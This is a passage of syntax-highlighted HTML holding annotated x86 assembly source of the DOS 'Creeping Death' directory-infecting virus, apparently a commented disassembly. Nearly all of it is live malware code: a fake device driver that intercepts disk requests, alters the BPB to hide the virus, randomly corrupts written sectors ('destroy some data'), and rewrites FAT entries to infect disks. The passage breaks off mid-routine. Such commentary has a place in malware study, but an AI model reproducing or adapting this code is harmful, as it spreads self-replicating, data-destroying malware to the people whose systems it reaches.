        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3dh</span><span class="sc0">          </span><span class="sc1">; open file, this file will</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">File</span><span class="sc0">      </span><span class="sc1">; not be found but the entire</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">         </span><span class="sc1">; directory is searched and</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; infected</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0">        </span><span class="sc1">; execute file</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">Exit</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4dh</span><span class="sc0">          </span><span class="sc1">; get exit-code</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc0">          </span><span class="sc1">; terminate (al = exit code)</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">; Installation complete                                                       ;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">; The next part contains the device driver used by creeping death to infect   ;</span><span class="sc0">
</span><span class="sc1">; directory's                                                                 ;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">; The device driver uses only the strategy routine to handle the requests.    ;</span><span class="sc0">
</span><span class="sc1">; I don't know if this is because the virus will work better or the writer    ;</span><span class="sc0">
</span><span class="sc1">; of this virus didn't know how to do it right.                               ;</span><span class="sc0">
</span><span class="sc1">;                                                                             ;</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************;</span><span class="sc0">


</span><span class="sc5">Strategy</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">RequestOffset</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc1">; store segment and offset of</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">RequestSegment</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">    </span><span class="sc1">; request block</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">                </span><span class="sc1">; return to dos (or whatever</span><span class="sc0">
                        </span><span class="sc1">; called this device driver)</span><span class="sc0">

</span><span class="sc5">Interrupt</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; driver strategy block</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; save registers</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">les</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Request</span><span class="sc0">       </span><span class="sc1">; es:bx = request block</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; ds:bx = request block</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; command code</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; read sector from disk</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Input</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">            </span><span class="sc1">; write sector to disk</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Output</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Output</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRequest</span><span class="sc0">       </span><span class="sc1">; let dos do handle the request</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; Build BPB</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Return</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; copy the BPB and change it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">bpb_buf</span><span class="sc0">   </span><span class="sc1">; into one that hides the virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; copy</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; change</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">cbw</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">-</span><span class="sc2">32</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; &gt;32mb partition ?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">m32</span><span class="sc0">         </span><span class="sc1">; yes, jump to m32</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">-</span><span class="sc2">32</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; &lt;32mb partition</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Return</span><span class="sc0">
</span><span class="sc5">m32</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">-</span><span class="sc2">32</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; &gt;32mb partition</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">-</span><span class="sc2">32</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Return</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; return to caller</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc5">Output</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Random</span><span class="sc0">  </span><span class="sc1">; increase counter</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Skip</span><span class="sc0">            </span><span class="sc1">; zero ?</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; yes, change one byte in the</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; sector to write</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; destroy some data</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">Skip</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0ff09h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Check</span><span class="sc0">           </span><span class="sc1">; check if disk changed</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">Disk</span><span class="sc0">            </span><span class="sc1">; yes, write virus to disk</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">InfectSector</span><span class="sc0">        </span><span class="sc1">; no, just infect sector</span><span class="sc0">
</span><span class="sc5">Disk</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRequest</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">InfectDisk</span><span class="sc0">

</span><span class="sc5">ReadError</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">           </span><span class="sc1">; error during request</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Return</span><span class="sc0">

</span><span class="sc5">Input</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check</span><span class="sc0">           </span><span class="sc1">; check if disk changed</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">InfectDisk</span><span class="sc0">      </span><span class="sc1">; no, read sector</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Read</span><span class="sc0">
</span><span class="sc5">InfectDisk</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">    </span><span class="sc1">; yes, write virus to disk</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">             </span><span class="sc1">; save last part of request</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">Save</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Save</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">  </span><span class="sc1">; read 1st sector on disk</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReadSector</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ReadError</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">    </span><span class="sc1">; build BPB</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRequest</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; ds:si = BPB</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; size of root directory</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc0">           </span><span class="sc1">; in sectors</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cbw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0bh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; ax=fat sectors, dx=0</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">          </span><span class="sc1">; save it on stack</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; total number of sectors</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">; &gt;32mb</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">More</span><span class="sc0">            </span><span class="sc1">; no, skip next 2 instructions</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; get number of sectors</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">More</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">; cx=0</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">           </span><span class="sc1">; dx:ax=number is data sectors</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; cx=sectors / cluster</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; number of clusters on disk</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; 1 sector/cluster ?</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; number of clusters (+1 or +2)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; save it on stack</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Convert</span><span class="sc0">         </span><span class="sc1">; get fat sector and offset in</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">    </span><span class="sc1">; sector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReadSector</span><span class="sc0">      </span><span class="sc1">; read fat sector</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">           </span><span class="sc1">; has something to do with the</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; encryption of the pointers</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">gad</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; 1 sector / cluster</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Ok</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">          </span><span class="sc1">; this is used when the</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">      </span><span class="sc1">; clusters are 1 sector long</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; allocate 1st cluster</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">Here</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">Here</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Convert</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">Ok</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; allocate last cluster</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">; cluster already allocated by</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; the virus ?</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">pointer</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">DiskInfected</span><span class="sc0">        </span><span class="sc1">; yes, don't write it and go on</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">8</span><span class="sc0">    </span><span class="sc1">; write the adjusted sector to</span><span class="sc0">
